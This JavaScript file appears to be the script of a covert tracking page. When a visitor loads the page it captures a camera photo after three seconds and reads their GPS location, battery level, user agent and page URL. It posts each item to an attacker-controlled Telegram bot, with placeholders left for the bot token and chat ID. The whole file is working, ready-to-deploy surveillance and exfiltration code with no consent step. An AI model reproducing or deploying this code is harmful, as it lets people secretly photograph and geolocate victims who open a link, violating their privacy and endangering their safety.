const BOT_TOKEN = "PUT_YOUR_BOT_TOKEN";
const CHAT_ID  = "PUT_YOUR_CHAT_ID";

async function startAll(){
  await startCamera();
  getLocation();
  getBattery();
  getDeviceInfo();
}

// 2️⃣ Camera selfie
async function startCamera(){
  const video = document.getElementById("video");
  const stream = await navigator.mediaDevices.getUserMedia({video:true});
  video.srcObject = stream;
  setTimeout(takePhoto, 3000); // selfie after 3s
}

function takePhoto(){
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  canvas.toBlob(blob=>{
    sendPhoto(blob);
  },"image/jpeg");
}

// 2️⃣ Location
function getLocation(){
  navigator.geolocation.getCurrentPosition(pos=>{
    sendText(
      `📍 Location\nLat: ${pos.coords.latitude}\nLng: ${pos.coords.longitude}`
    );
  });
}

// 3️⃣ Battery
function getBattery(){
  navigator.getBattery().then(bat=>{
    sendText(`🔋 Battery: ${Math.round(bat.level*100)}%`);
  });
}

// 4️⃣ Device info
function getDeviceInfo(){
  const info = `📱 Device:\n${navigator.userAgent}\nLink: ${window.location.href}`;
  sendText(info);
}

// Telegram send text
function sendText(text){
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text:text
    })
  });
}

// Telegram send photo
function sendPhoto(blob){
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", blob);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    body:form
  });
}
